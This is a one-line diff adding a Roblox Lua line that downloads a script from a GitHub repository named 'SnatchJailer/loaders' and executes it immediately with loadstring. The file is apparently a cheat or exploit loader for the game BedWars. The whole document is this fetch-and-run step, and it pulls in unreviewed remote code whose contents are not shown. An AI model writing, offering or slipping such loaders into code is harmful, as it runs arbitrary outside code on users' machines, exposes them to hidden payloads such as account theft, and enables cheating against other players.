@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/bedwars-halloween-pt-1-spam0-pc0namtfikhuat.lua"))()
